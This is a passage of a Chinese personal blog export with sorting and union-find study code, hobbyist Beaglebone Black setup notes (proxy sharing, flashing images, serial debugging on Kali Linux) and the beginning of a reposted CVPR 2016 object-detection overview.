class="line">&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;两个有序数组合并成一个有序数组</span><br><span class="line">&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">void merge(int a[], int tmp_array[], int l, int r, int r_end) &#123;</span><br><span class="line">    int num &#x3D; r_end - l + 1;</span><br><span class="line">    int tmp_position &#x3D; l;</span><br><span class="line">    int l_end &#x3D; r - 1;</span><br><span class="line"></span><br><span class="line">    while (l &lt;&#x3D; l_end &amp;&amp; r &lt;&#x3D; r_end) &#123;</span><br><span class="line">        if (a[l] &lt; a[r]) &#123;</span><br><span class="line">            tmp_array[tmp_position++] &#x3D; a[l++];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            tmp_array[tmp_position++] &#x3D; a[r++];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    while (l &lt;&#x3D; l_end) &#123;</span><br><span class="line">        tmp_array[tmp_position++] &#x3D; a[l++];</span><br><span class="line">    &#125;</span><br><span class="line">    while (r &lt;&#x3D; r_end) &#123;</span><br><span class="line">        tmp_array[tmp_position++] &#x3D; a[r++];</span><br><span class="line">    &#125;</span><br><span class="line">    for (i &#x3D; 0; i &lt; num; i++, r_end--) &#123;</span><br><span class="line">        a[r_end] &#x3D; tmp_array[r_end];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void msort(int a[], int tmp_array[], int l, int r) &#123;</span><br><span class="line">    int center;</span><br><span class="line">    if (l &lt; r) &#123;</span><br><span class="line">        center &#x3D; (l + r) &#x2F; 2;&#x2F;&#x2F;c-l&lt;&#x3D;r-c</span><br><span class="line">        msort(a, tmp_array, l, center);</span><br><span class="line">        msort(a, tmp_array, center + 1, r);</span><br><span class="line">        merge(a, tmp_array, l, center + 1, r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void merge_sort(int a[]) &#123;</span><br><span class="line">    int tmp_array[N];</span><br><span class="line">    msort(a, tmp_array, 0, N - 1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;高中的时候能一分钟敲完的算法</span><br><span class="line">&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">void qsort(int a[], int left, int right) &#123;</span><br><span class="line">    int i, j, t, tmp;</span><br><span class="line">    if (left &gt; right)</span><br><span class="line">        return;</span><br><span class="line"></span><br><span class="line">    tmp &#x3D; a[left];</span><br><span class="line">    i &#x3D; left;</span><br><span class="line">    j &#x3D; right;</span><br><span class="line">    while (i !&#x3D; j) &#123;</span><br><span class="line">        while (a[j] &gt;&#x3D; tmp &amp;&amp; i &lt; j) j--;</span><br><span class="line">        while (a[i] &lt;&#x3D; tmp &amp;&amp; i &lt; j) i++;</span><br><span class="line">        if (i &lt; j) &#123;</span><br><span class="line">            t &#x3D; a[i];</span><br><span class="line">            a[i] &#x3D; a[j];</span><br><span class="line">            a[j] &#x3D; t;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;&#x2F;&#x2F;左边大的跟右边小的交换，使得左边的小于tmp，右边的大于tmp</span><br><span class="line">    a[left] &#x3D; a[i];</span><br><span class="line">    a[i] &#x3D; tmp;</span><br><span class="line">    &#x2F;&#x2F;tmp放在中间</span><br><span class="line"></span><br><span class="line">    qsort(a, left, i - 1);</span><br><span class="line">    qsort(a, i + 1, right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void quick_sort(int a[]) &#123;</span><br><span class="line">    qsort(a, 0, 9);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">&#x2F;&#x2F;    int a[10] &#x3D; &#123;4, 85, 3, 234, 45, 346, 345, 122, 30, 12&#125;;</span><br><span class="line">&#x2F;&#x2F;    insert_sort(a);</span><br><span class="line">&#x2F;&#x2F;    printf(&quot;insert_sort: &quot;);</span><br><span class="line">&#x2F;&#x2F;    print(a);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;    int a[10] &#x3D; &#123;4, 85, 3, 234, 45, 346, 345, 122, 30, 12&#125;;</span><br><span class="line">&#x2F;&#x2F;    shell_sort(a);</span><br><span class="line">&#x2F;&#x2F;    printf(&quot;shell_sort: &quot;);</span><br><span class="line">&#x2F;&#x2F;    print(a);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;    int a[10] &#x3D; &#123;4, 85, 3, 234, 45, 346, 345, 122, 30, 12&#125;;</span><br><span class="line">&#x2F;&#x2F;    heap_sort(a);</span><br><span class="line">&#x2F;&#x2F;    printf(&quot;heap_sort: &quot;);</span><br><span class="line">&#x2F;&#x2F;    print(a);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;    int a[10] &#x3D; &#123;4, 85, 3, 234, 45, 346, 345, 122, 30, 12&#125;;</span><br><span class="line">&#x2F;&#x2F;    merge_sort(a);</span><br><span class="line">&#x2F;&#x2F;    printf(&quot;merge_sort: &quot;);</span><br><span class="line">&#x2F;&#x2F;    print(a);</span><br><span class="line"></span><br><span class="line">    int a[10] &#x3D; &#123;4, 85, 3, 234, 45, 346, 345, 122, 30, 12&#125;;</span><br><span class="line">    quick_sort(a);</span><br><span class="line">    printf(&quot;quick_sort: &quot;);</span><br><span class="line">    print(a);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="0x08-并查集"><a href="#0x08-并查集" class="headerlink" title="0x08 并查集"></a>0x08 并查集</h2><p>看到书中说的<code>不相交集ATD</code>简直不明所云，看完以后发现这不就是之前学的并查集嘛&gt;_&lt;</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;https:&#x2F;&#x2F;www.cnblogs.com&#x2F;douzujun&#x2F;p&#x2F;6402312.html</span><br><span class="line"></span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">const int maxn &#x3D; 1000 + 100;</span><br><span class="line">int par[maxn];     &#x2F;&#x2F;父亲,  当par[x] &#x3D; x时,x是所在的树的根</span><br><span class="line">int Rank[maxn];    &#x2F;&#x2F;树的高度</span><br><span class="line">const int n &#x3D; 6;</span><br><span class="line">const int max_num &#x3D; 10;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;初始化n个元素</span><br><span class="line">void init(int n) &#123;</span><br><span class="line">    for (int i &#x3D; 0; i &lt; n; i++) &#123;</span><br><span class="line">        par[i] &#x3D; i;</span><br><span class="line">        Rank[i] &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;查询树的根</span><br><span class="line">int find(int x) &#123;</span><br><span class="line">    if (par[x] &#x3D;&#x3D; x) &#123;</span><br><span class="line">        return x;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return par[x] &#x3D; find(par[x]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;合并x和y所属集合</span><br><span class="line">void unite(int x, int y) &#123;</span><br><span class="line">    x &#x3D; find(x);</span><br><span class="line">    y &#x3D; find(y);</span><br><span class="line">    if (x &#x3D;&#x3D; y) return;</span><br><span class="line"></span><br><span class="line">    if (Rank[x] &lt; Rank[y]) &#123;</span><br><span class="line">        par[x] &#x3D; y;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        par[y] &#x3D; x;</span><br><span class="line">        if (Rank[x] &#x3D;&#x3D; Rank[y]) Rank[x]++;    &#x2F;&#x2F;如果x,y的树高相同,就让x的树高+1</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;判断x和y是否属于同一个集合</span><br><span class="line">bool same(int x, int y) &#123;</span><br><span class="line">    return find(x) &#x3D;&#x3D; find(y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void printUF() &#123;</span><br><span class="line">    printf(&quot;num\t\t&quot;);</span><br><span class="line">    for (int i &#x3D; 0; i &lt; max_num; i++) &#123;</span><br><span class="line">        printf(&quot;%d &quot;, i);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\npar\t\t&quot;);</span><br><span class="line"></span><br><span class="line">    for (int i &#x3D; 0; i &lt; max_num; i++) &#123;</span><br><span class="line">        printf(&quot;%d &quot;, par[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\nrank\t&quot;);</span><br><span class="line">    for (int i &#x3D; 0; i &lt; max_num; i++) &#123;</span><br><span class="line">        printf(&quot;%d &quot;, Rank[find(i)]);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    init(max_num);</span><br><span class="line"></span><br><span class="line">    int a[n] &#x3D; &#123;1, 2, 5, 6, 4, 7&#125;;</span><br><span class="line">    int b[n] &#x3D; &#123;1, 1, 1, 6, 6, 4&#125;;</span><br><span class="line">    for (int i &#x3D; 0; i &lt; n; i++) &#123;</span><br><span class="line">        unite(a[i], b[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;初始化:\n&quot;);</span><br><span class="line">    printUF();</span><br><span class="line">    unite(9, 8);</span><br><span class="line">    printf(&quot;合并(9,8):\n&quot;);</span><br><span class="line">    printUF();</span><br><span class="line">    unite(8, 1);</span><br><span class="line">    printf(&quot;合并(8,1)，此时rank变成2:\n&quot;);</span><br><span class="line">    printUF();</span><br><span class="line">    printf(&quot;(1,4)是否在一个集合:\n&quot;);</span><br><span class="line">    printf(&quot;%d\n&quot;, same(1, 4));</span><br><span class="line">    unite(1, 4);</span><br><span class="line">    printf(&quot;(1,4)是否在一个集合:\n&quot;);</span><br><span class="line">    printf(&quot;%d\n&quot;, same(1, 4));</span><br><span class="line">    printUF();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Beaglebone Black 折腾笔记（一） 折腾些没用的</title>
    <url>/post/Beaglebone-Black_01/</url>
    <content><![CDATA[<p><img src="http://qiniu.s1nh.org/Blog_BBB-setup_1.jpg-QNthin"></p>
<p>最近没有什么特别紧急的工作，终于有时间做点喜欢的事情了。</p>
<span id="more"></span>

<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>从仓库里面挑了几个还能用的显示器，找出了好久之前买的Beaglebone Black (BBB)，买了micro HDMI -&gt; DVI , Display Port -&gt; DVI , Mini Display Port -&gt; DVI 转接线，准备搭建一个新的工作平台。</p>
<p><img src="http://qiniu.s1nh.org/Blog_BBB-setup_2.jpg-QNthin"></p>
<h3 id="杜邦线"><a href="#杜邦线" class="headerlink" title="杜邦线"></a>杜邦线</h3><p>之前串口调试线太短了，并且容易插错，就去广埠屯买了这种线（老板说叫杜邦线），并且买了4/7的插头各一个。以后就不用纠结哪根线插在哪个针上了。</p>
<p><img src="http://qiniu.s1nh.org/Blog_BBB-setup_3.jpg-QNthin"></p>
<p><img src="http://qiniu.s1nh.org/Blog_BBB-setup_4.jpg-QNthin"></p>
<h3 id="TP-Link-交换机指示灯全亮修复"><a href="#TP-Link-交换机指示灯全亮修复" class="headerlink" title="TP-Link 交换机指示灯全亮修复"></a>TP-Link 交换机指示灯全亮修复</h3><p>实验室有两台服务器、一个工作站、Mac Mini和BBB，想把它们组建成局域网。</p>
<p>从办公室里翻出来了一个坏的交换机，通电后发现所有的灯常亮。百度了一下好多这种现象，可能是TP-link的通病。拆开以后可以看到3个电容爆了，去电子市场买了3个3300uF/16V的电容，问题解决。</p>
<p><img src="http://qiniu.s1nh.org/Blog_BBB-setup_5.jpg-QNthin"></p>
<p><img src="http://qiniu.s1nh.org/Blog_BBB-setup_6.jpg-QNthin"></p>
<p><img src="http://qiniu.s1nh.org/Blog_BBB-setup_8.jpg-QNthin"></p>
<p>在换电容的时候发现了一个奇怪的问题，为什么电路板上会有下面这种一条一条的焊锡线（下图）</p>
<p><img src="http://qiniu.s1nh.org/Blog_BBB-setup_7.jpg-QNthin"></p>
<h3 id="在局域网中使用代理共享LANTERN来翻墙"><a href="#在局域网中使用代理共享LANTERN来翻墙" class="headerlink" title="在局域网中使用代理共享LANTERN来翻墙"></a>在局域网中使用代理共享LANTERN来翻墙</h3><p>给BBB下载了最新版的Debian 8.X，安装后执行apt-get时出现了问题，<code>rcn-ee.com/repos</code>源被墙了。因为是armhf架构，所以找了半天都找不到合适的源。最后就决定用Latern共享代理服务器来翻墙。(Lantarn简直太好用了，<a href="/post/Lantern/">安装方式点这里</a>)</p>
<p>具体实现方式参考了：<a href="https://github.com/getlantern/lantern/issues/2940">《如何在局域网中共享LANTERN来翻墙？》</a>、<a href="https://xiaolan.me/lantern2.html">《Lantern 2.x翻墙教程》</a></p>
<p>实施方案如下：</p>
<ul>
<li>运行Win+R，打开<code>%AppData%/Lantern/</code></li>
<li>修改lantern-2.0.10.yaml的<code>addr: 127.0.0.1:8787</code>为<code>addr: 0.0.0.0:8787</code></li>
<li>重启Lantern</li>
<li>在BBB中输入<code>export http_proxy=http://192.168.1.100:8787/</code>，<code>export https_proxy=http://192.168.1.100:8787/</code>（192.168.1.100为运行Latern电脑的ip）为其设置代理</li>
</ul>
<p>设置完以后，用Wget随便下载个东西，如果提示connected，就设置好啦（如下图）</p>
<p><img src="http://qiniu.s1nh.org/Blog_BBB-setup_9.jpg-QNthin"></p>
<p>设置完以后我的BBB就已经可以愉快的更新内核了。</p>
<p>可是！最后发现了两个问题：</p>
<pre><code>1. 修改完 lantern-2.0.10.yaml 后，本机电脑无法翻墙；
2. 重新启动 Lantern 后，lantern-2.0.10.yaml 被自动恢复到了初始状态。
</code></pre>
<p>也就是说，设置的代理只能用一次，重启Lantern就失效了；并且设置完代理以后，开启Lantern的电脑是无法翻墙的（这个好像可以通过把0.0.0.0改成本机ip:192.168.1.100来解决）</p>
<h3 id="更新node-js"><a href="#更新node-js" class="headerlink" title="更新node.js"></a>更新node.js</h3><p>执行apt-get更新软件的时候又报错了&gt;_&lt; 说什么node版本太旧了</p>
<p><img src="http://qiniu.s1nh.org/Blog_BBB-setup_10.jpg-QNthin"></p>
<p>找了一下更新node的办法：</p>
<pre><code>npm install -g n //居然有名字叫&quot;n&quot;的软件
n latest
</code></pre>
<p>再看一下版本，瞬间从0.10.40变成了5.1.1（我觉得这步肯定出问题了，版本怎么变化这么大 0_0）</p>
<p><img src="http://qiniu.s1nh.org/Blog_BBB-setup_11.jpg-QNthin"></p>
]]></content>
      <categories>
        <category>硬件</category>
      </categories>
      <tags>
        <tag>Beaglebone Black</tag>
        <tag>Lantern</tag>
        <tag>node.js</tag>
      </tags>
  </entry>
  <entry>
    <title>Beaglebone Black 折腾笔记（二） 搭建环境</title>
    <url>/post/Beaglebone-Black_02/</url>
    <content><![CDATA[<p>听说最近推出了5美元的树莓派，一度被黄牛抢光然后卖到了50美元。</p>
<span id="more"></span>

<p>之前在逛Kali社区的时候发现的Beaglebone Black (BBB)，第一次了解这种嵌入式开发板，简直像看到了新大陆，爱不释手。买了开发板可以做<a href="http://buzzorange.com/techorange/2015/12/07/rasberry-pi-10-things/">一些很好玩的东西</a>和<a href="http://makezine.com/2013/06/05/33-rpi-beowulf-cluster/">很牛逼的项目</a>等各种有意思的事情。</p>
<p>5美元的树莓派估计明年在国内才能买到，对于现在来说，BBB应该是一个很不错的解决方案：<a href="http://www.geekfan.net/5246/">嵌入式平台选择：树莓派 or BeagleBone Black（BBB）</a></p>
<h2 id="安装BBB"><a href="#安装BBB" class="headerlink" title="安装BBB"></a>安装BBB</h2><h3 id="准备好各个版本的Linux-for-BBB"><a href="#准备好各个版本的Linux-for-BBB" class="headerlink" title="准备好各个版本的Linux for BBB"></a>准备好各个版本的Linux for BBB</h3><ul>
<li><a href="http://beagleboard.org/latest-images">BeagleBoard.org Latest Firmware Images</a>：BBB官方页面的下载链接，我在这下载了<em>bone-debian-8.2-tester-2gb-armhf-2015-11-12-2gb.img.xz</em>，刷到Flash以后，发现没有LXDE桌面环境。</li>
<li><a href="http://elinux.org/Beagleboard:BeagleBoneBlack_Debian">Beagleboard:BeagleBoneBlack Debian</a>：Embedded Linux。在Debian Releases里可以下载到各种版本的Image。</li>
<li><a href="https://www.offensive-security.com/kali-linux-vmware-arm-image-download/">Kali Linux Downloads – Custom Images</a>：Kali Linux，可是官网的2.0.1版好像有个USB的Bug，在下文中有提出。</li>
<li><a href="https://www.kali.org/kali-linux-features/">Kali Linux Features</a>|<a href="https://www.offensive-security.com/kali-linux/generating-kali-raspberry-pi-images/">Generating Kali Raspberry Pi Images</a>|<a href="https://github.com/offensive-security/kali-arm-build-scripts">Kali Linux ARM build scripts</a>：Kali Linux，这三个网站好像是教你怎么自己编译镜像的</li>
</ul>
<p>要注意的是，BBB 现在推出了有4G eMMC 的 Rev C，所以下载之前一定要看好<code>版本号(Rev)</code>；还有要注意的是要主意<code>microSD/Standalone</code>和<code>lxde/console</code>。</p>
<p>注意，有些网站在天朝被墙了，请参照之前的文章用<a href="/tags/Lantern/">Lantern</a>翻墙。</p>
<h3 id="安装Image到microSD卡"><a href="#安装Image到microSD卡" class="headerlink" title="安装Image到microSD卡"></a>安装Image到microSD卡</h3><p>分别在插入/拔出SD卡的时候输入命令<code>ls /dev</code>，查看SD卡的磁盘名称，我的是<code>disk2</code>。</p>
<pre><code>//警告！如果不知道dd命令是干嘛的，或者不知道我上面说的`disk2`是怎么来的
//在你baidu清楚之前，不要执行下面那行代码。

dd if=BBB-eMMC-flasher-debian-7.9-lxde-armhf-2015-11-03-2gb.img of=/dev/rdisk2 bs=1m
</code></pre>
<ul>
<li>如果提示<code>dd: bs: illegal numeric value</code>，把<code>bs=1m</code>改为<code>bs=1M</code>。</li>
<li>如果提示<code>Resource busy</code>，记得Unmount SD卡</li>
</ul>
<h3 id="将Image写入eMMC"><a href="#将Image写入eMMC" class="headerlink" title="将Image写入eMMC"></a>将Image写入eMMC</h3><p>镜像写入SD卡后，修改<code>/boot/uEnv.txt</code>，把下面第二行前面的”#”去掉。</p>
<pre><code>##enable BBB: eMMC Flasher:
#cmdline=init=/opt/scripts/tools/eMMC/init-eMMC-flasher-v3.sh
</code></pre>
<p>重新启动，就会看到BBB的四个LED灯像流水一样闪烁。刷完以后BBB会自动关机。等它刷新完eMMC以后，记得拔出microSD卡，否则下次开机后会重新刷一遍- -</p>
<h3 id="安装LXDE"><a href="#安装LXDE" class="headerlink" title="安装LXDE"></a>安装LXDE</h3><p>在官网下载了Debian8.2的Image，安装完毕后发现没有桌面环境。输入以下命令手动安装<a href="http://wiki.lxde.org/zh/Debian">LXDE桌面环境</a>：</p>
<pre><code>aptitude install --without-recommends lxde  //安装简化版的LXDE
apt-get install xorg xserver-xorg           //如果不安装这个，没有startx命令                    
</code></pre>
<p>安装完毕后，执行<code>startx</code>运行桌面环境。启动后的桌面环境会报错<code>no session for pid ****</code>，不知道是什么原因耶。</p>
<p>因为板载eMMC只有2G，最后我放弃了这种方式，选择了直接使用4G-SD卡的Image。</p>
<h2 id="串口调试"><a href="#串口调试" class="headerlink" title="串口调试"></a>串口调试</h2><p>在嵌入式开发和单片机开发，串口是必不可少是外设设备。当你的BBB出问题无法启动时，你可以通过串口对它进行调试。</p>
<p>今天研究的是如何在Linux 下使用串口调试。Windows 的之前已经尝试过，要在<a href="http://www.ftdichip.com/Drivers/VCP.htm">ftdichip</a>下载驱动，然后安装一个串口调试软件即可。</p>
<p>###准备串口驱动</p>
<p><a href="http://blog.csdn.net/david_xtd/article/details/24541627">Linux环境下使用 USB转串口驱动</a></p>
<p>Kali Linux 已经自带了串口驱动，执行<code>dmesg | grep tty</code>看到了满屏幕的<code>ttyUSB0</code></p>
<pre><code>root@kali:~# dmesg | grep tty
[    0.000000] console [tty0] enabled
[  196.623578] usb 1-2.1: FTDI USB Serial Device converter now attached to ttyUSB0
[  260.219668] ftdi_sio ttyUSB0: FTDI USB Serial Device converter now disconnected from ttyUSB0
[  261.507543] usb 1-2.1: FTDI USB Serial Device converter now attached to ttyUSB0
[  515.250387] ftdi_sio ttyUSB0: failed to get modem status: -71
[  517.252789] ftdi_sio ttyUSB0: error from flowcontrol urb
[  526.263896] ftdi_sio ttyUSB0: ftdi_set_termios FAILED to set databits/stopbits/parity
[  527.264684] ftdi_sio ttyUSB0: ftdi_set_termios urb failed to set baudrate
[  529.267373] ftdi_sio ttyUSB0: urb failed to clear flow control
[  533.273013] ftdi_sio ttyUSB0: failed to get modem status: -71
[  535.275199] ftdi_sio ttyUSB0: error from flowcontrol urb
[  559.407134] ftdi_sio ttyUSB0: FTDI USB Serial Device converter now disconnected from ttyUSB0
[  747.635485] usb 1-2.1: FTDI USB Serial Device converter now attached to ttyUSB0
[  871.627615] ftdi_sio ttyUSB0: FTDI USB Serial Device converter now disconnected from ttyUSB0
[  886.630016] usb 1-2.1: FTDI USB Serial Device converter now attached to ttyUSB0
[  947.461802] ftdi_sio ttyUSB0: FTDI USB Serial Device converter now disconnected from ttyUSB0
[  962.820144] usb 1-2.1: FTDI USB Serial Device converter now attached to ttyUSB0
[ 3345.864141] ftdi_sio ttyUSB0: error from flowcontrol urb
[ 3345.864523] ftdi_sio ttyUSB0: FTDI USB Serial Device converter now disconnected from ttyUSB0
[ 3387.249864] usb 1-2.1: FTDI USB Serial Device converter now attached to ttyUSB0
[ 6856.149365] ftdi_sio ttyUSB0: usb_serial_generic_read_bulk_callback - urb stopped: -32
[ 8138.331832] ftdi_sio ttyUSB0: FTDI USB Serial Device converter now disconnected from ttyUSB0
[ 8144.025392] usb 1-2.1: FTDI USB Serial Device converter now attached to ttyUSB0
</code></pre>
<p>###准备Minicom</p>
<p><a href="https://help.ubuntu.com/community/Minicom">Minicom</a></p>
<ul>
<li><p>Kali Linux 已经给装好了Minicom，执行一下<code>minicom -s</code>，按照下面命令配置好串口<code>A -    Serial Device      : /dev/ttyUSB0</code></p>
</li>
<li><p><a href="http://blog.csdn.net/bird67/article/details/2127235">linux超级终端minicom的使用方法</a>，这篇文章还说要“将 Hardware Flow Control 设 为 NO”，“修改Modem and dialing, 将Init string, Reset string, Hang-up string设置为空” </p>
</li>
<li><p>设置完成后选择Save setup as dfl将当前设置保存为默认设置</p>
</li>
</ul>
<h2 id="已知问题"><a href="#已知问题" class="headerlink" title="已知问题"></a>已知问题</h2><h3 id="移动鼠标时会卡死"><a href="#移动鼠标时会卡死" class="headerlink" title="移动鼠标时会卡死"></a>移动鼠标时会卡死</h3><p>很开心的进入GUI界面以后，移动鼠标准备点击输入密码，然后BBB居然卡死了。卡死以后，敲击鼠标、键盘没有反应，LED 灯也不闪了。又试了几次，只要不移动鼠标，通过键盘输入<code>root/toor</code>正常进入Desktop；不论在什么状态下，只要一碰鼠标，等三秒钟电脑就卡死了。</p>
<h4 id="第一次尝试解决"><a href="#第一次尝试解决" class="headerlink" title="第一次尝试解决"></a>第一次尝试解决</h4><p>Google了一下，还真有人碰到了这个问题：<a href="https://bugs.kali.org/view.php?id=2510#bugnotes">0002510: Beaglebone mouse crash</a>；继续Google，看到了这个：<br><a href="http://g4fre.blogspot.com/2014/01/beaglebone-black-ubuntu-1310-with.html">BeagleBone Black Ubuntu 13.10 with desktop… another UBUNTU FAILURE!!</a>，上面balabala一大堆没怎么看懂，后面有一个人给了解决方案：<em>According to armhf we must rebuild the modules dependency list. run depmod -a -v “3.8.13-bone30” as root. <a href="http://www.armhf.com/index.php/boards/beaglebone-black/">http://www.armhf.com/index.php/boards/beaglebone-black/</a></em> </p>
<pre><code>root@kali:~# uname -a       //查看版本号                                                    
Linux kali 3.8.13-bone53 #1 SMP Thu Aug 13 23:27:51 CDT 2015 armv7l GNU/Linux   
root@kali:~# depmod -a -v &quot;3.8.13-bone53&quot;
</code></pre>
<p>运行以后重启电脑，发现并没有什么卵用，继续卡死。</p>
<h4 id="第二次尝试"><a href="#第二次尝试" class="headerlink" title="第二次尝试"></a>第二次尝试</h4><p>然后又翻到了这篇：<a href="http://stackoverflow.com/questions/27065598/beaglebone-black-freezes">stackoverflow: BeagleBone Black freezes</a>，回复说是TI的这个芯片里面的中断控制器设计问题，会导致“babble”中断响应；<a href="http://e2e.ti.com/support/arm/sitara_arm/f/791/t/308549">AM335X USB babble interrupt when DP and DM are both high in full-speed mode</a>当一个full-speed USB 的 DP 和 DM 信号都在高电平时就会产生这种中断响应。</p>
<p>看到这，貌似无解了，可是我在用<strong>官方的Debian， 并运行lxde GUI的时候，并不会卡死</strong>。</p>
<p><em>我在用串口调试的时候发现，虽然对USB进行插拔的时候会出现“babble”中断，可是这并不是导致系统锁死的原因。因为我在用官方镜像的时候也会出现“babble”中断，可是并没有任何卡死。</em></p>
<h4 id="第三次：更新内核"><a href="#第三次：更新内核" class="headerlink" title="第三次：更新内核"></a>第三次：更新内核</h4><p>又看到了一篇文章，这个问题只出现在3.8.13版本的kernel中。可是Kali Linux 只提供这个版本的Kernel，明天我试一下安装官方4.0版本的Kernel</p>
<p><a href="https://bugs.kali.org/view.php?id=2610&history=1#history">0002610: Cannot change wireless MAC with Ralink 3070 and Beaglebone Black 3.8.13 kernel</a>这里好像有介绍。</p>
<p><em>更新内核失败了:(</em></p>
<h4 id="最后的解决方案"><a href="#最后的解决方案" class="headerlink" title="最后的解决方案"></a>最后的解决方案</h4><p>很丢脸的解决方案：我安装了1.0.9的Image，然后dist-upgrade升级到sana。</p>
]]></content>
      <categories>
        <category>硬件</category>
      </categories>
      <tags>
        <tag>Beaglebone Black</tag>
        <tag>Kali Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>CVPR2016目标检测领域</title>
    <url>/post/CVPR2016/</url>
    <content><![CDATA[<blockquote>
<p>转载自<a href="https://zhuanlan.zhihu.com/p/21533724">https://zhuanlan.zhihu.com/p/21533724</a></p>
</blockquote>
<p>2016年的CVPR会议目标检测（在这里讨论的是2D的目标检测，如图1所示）的方法主要是基于卷积神经网络的框架，代表性的工作有ResNet[1]（Kaiming He等）、YOLO[5]（Joseph Redmon等）、LocNet[7]（Spyros Gidaris等）、HyperNet[3]（Tao Kong等）、ION[2]（Sean Bell等）、G-CNN[6]（Mahyar Najibi等）。在这里之所以把ResNet也放进来，是因为有效的特征对于目标检测领域是极为重要的。</p>
<p><img src="http://qiniu.s1nh.org/Blog_CVPR2016_0.jpg-QNthin" alt="2D目标检测示意图" title="2D目标检测示意图"></p>
<span id="more"></span>

<p>在目标检测中，以下几个指标非常重要：（a）识别精度；（b）识别效率；（c）定位准确性。以上的几个工作或者侧重识别率和效率，或者通过某种方式提高定位的准确性，下面分别展开进行描述。</p>
<p>研读了CVPR2016的部分文章，发现会议接收的论文里几乎全都是关于深度学习的内容。重点关注了提高目标检测识别精度的两篇文章ION和HyperNet。</p>
<p><a href="http://www.cv-foundation.org/openaccess/CVPR2016.py">CVPR文献</a></p>
<h2 id="1-识别精度"><a href="#1-识别精度" class="headerlink" title="1. 识别精度"></a>1. 识别精度</h2><p>说起识别精度，不得不提目标检测中衡量检测精度的指标mAP(mean average precision)。简单来讲就是在多个类别的检测中，每一个类别都可以根据recall和precision绘制一条曲线，那么AP就是该曲线下的面积，而mAP是多个类别AP的平均值，这个值介于0到1之间，且越大越好。具有代表性的工作是ResNet、ION和HyperNet。</p>
<h3 id="1-1-ResNet"><a href="#1-1-ResNet" class="headerlink" title="1.1.  ResNet"></a>1.1.  ResNet</h3><p>何凯明的代表作之一，获得了今年的bestpaper。文章不是针对目标检测来做的，但其解决了一个最根本的问题：更有力的特征。检测时基于Faster R-CNN的目标检测框架，使用ResNet替换VGG16网络可以取得更好的检测结果。（实际上，使用ResNet网络代替ZF, VGG, GoogleNet等网络模型无论在图像分类、目标检测还是图像分割等任务上都可以大大提高识别的准确率）</p>
<h3 id="1-2-ION（inside-outside-network）"><a href="#1-2-ION（inside-outside-network）" class="headerlink" title="1.2. ION（inside-outside-network）"></a>1.2. ION（inside-outside-network）</h3><blockquote>
